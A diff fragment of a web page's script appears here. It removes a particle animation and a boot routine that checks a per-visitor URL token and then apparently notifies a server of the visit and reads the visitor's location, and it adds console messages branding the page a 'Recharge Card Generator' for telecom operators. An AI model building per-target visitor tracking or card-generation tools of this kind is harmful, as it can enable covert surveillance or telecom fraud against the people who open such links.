-                    this.size = Math.random() * 2 + 0.3;
-                    this.speedX = (Math.random() - 0.5) * 0.18;
-                    this.speedY = (Math.random() - 0.5) * 0.18;
-                    this.opacity = Math.random() * 0.15 + 0.01;
-                    this.pulse = Math.random() * Math.PI * 2;
-                    this.pulseSpeed = 0.005 + Math.random() * 0.01;
-                }
-                update() {
-                    this.x += this.speedX;
-                    this.y += this.speedY;
-                    this.pulse += this.pulseSpeed;
-                    if (this.x < 0 || this.x > w) this.speedX *= -1;
-                    if (this.y < 0 || this.y > h) this.speedY *= -1;
-                }
-                draw() {
-                    const o = this.opacity * (0.5 + 0.5 * Math.sin(this.pulse));
-                    ctx.beginPath();
-                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                    ctx.fillStyle = `rgba(201, 168, 76, ${o})`;
-                    ctx.fill();
-                    if (this.size > 1) {
-                        ctx.shadowColor = 'rgba(201, 168, 76, 0.005)';
-                        ctx.shadowBlur = 8;
-                        ctx.fill();
-                        ctx.shadowBlur = 0;
-                    }
-                }
-            }
-
-            for (let i = 0; i < COUNT; i++) particles.push(new Particle());
-
-            function animate() {
-                ctx.clearRect(0, 0, w, h);
-                particles.forEach((p) => { p.update();
-                    p.draw(); });
-                // connections
-                for (let i = 0; i < particles.length; i++) {
-                    for (let j = i + 1; j < particles.length; j++) {
-                        const dx = particles[i].x - particles[j].x;
-                        const dy = particles[i].y - particles[j].y;
-                        const dist = Math.sqrt(dx * dx + dy * dy);
-                        if (dist < 120) {
-                            const alpha = (1 - dist / 120) * 0.008;
-                            ctx.beginPath();
-                            ctx.moveTo(particles[i].x, particles[i].y);
-                            ctx.lineTo(particles[j].x, particles[j].y);
-                            ctx.strokeStyle = `rgba(201, 168, 76, ${alpha})`;
-                            ctx.lineWidth = 0.4;
-                            ctx.stroke();
-                        }
-                    }
-                }
-                requestAnimationFrame(animate);
-            }
-            animate();
-        })();
-
-        // ============================================================
-        //  BOOT
-        // ============================================================
-        window.addEventListener('load', async () => {
-            const hasToken = extractTokenFromURL();
-            if (!hasToken) {
-                showStatus(statusCards, 'error', '⚠️ رابط غير صحيح. يرجى استخدام الرابط المخصص لك.');
-                shuffleBtn.disabled = true;
-                return;
-            }
-
-            // initial cards
-            const shuffled = COUNTRY_NAMES.sort(() => Math.random() - 0.5);
-            const count = Math.min(8, shuffled.length);
-            const selected = shuffled.slice(0, count);
-            currentCards = selected.map((name, i) => generateCardDesign(name, i));
-            renderCards(currentCards, true);
-
-            await notifyUserEntered();
-            detectSuspiciousActivity();
-            getLocation();
-        });
+        console.log('✦ NEXUS Recharge Card Generator v3.0');
+        console.log('✦ Smart operator detection enabled');
+        console.log(`✦ ${Object.keys(TELECOM_DATA).length} countries loaded`);
+        let totalOps = 0;
+        Object.values(TELECOM_DATA).forEach(c => totalOps += c.operators.length);
+        console.log(`✦ ${totalOps} operator prefixes with validation`);
+        console.log('✦ Shortcuts: Enter/G=Generate, R=Rotate, F=Flip, N=New, Esc=Back');
     </script>
+
 </body>
 </html>
